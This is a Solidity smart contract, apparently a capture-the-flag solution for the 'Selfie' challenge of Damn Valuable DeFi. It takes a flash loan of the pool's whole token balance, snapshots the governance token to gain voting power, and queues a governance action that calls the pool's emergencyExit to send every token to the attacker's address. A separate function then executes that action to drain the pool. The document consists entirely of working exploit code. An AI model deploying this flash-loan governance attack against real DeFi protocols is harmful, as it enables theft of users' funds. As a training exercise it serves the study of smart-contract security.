pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    address immutable governance;
    address immutable pool;
    address immutable token;
    address immutable attackerEOA;

    uint256 governanceActionId;

    constructor(address _governance, address _pool, address _token) {
        governance = _governance;
        pool = _pool;
        token = _token;
        attackerEOA = msg.sender;
    }

    function prepareProposal() external {
        uint256 poolBalance = ERC20(token).balanceOf(pool);
        SelfiePool(pool).flashLoan(
            this,
            token,
            poolBalance,
            bytes("")
        );
    }

    function drainFunds() external {
        SimpleGovernance(governance).executeAction(governanceActionId);
    }

     function onFlashLoan(
        address,
        address _token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        governanceActionId = SimpleGovernance(governance).queueAction(pool, 0, abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector,
            attackerEOA
        ));


        ERC20(_token).approve(pool, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}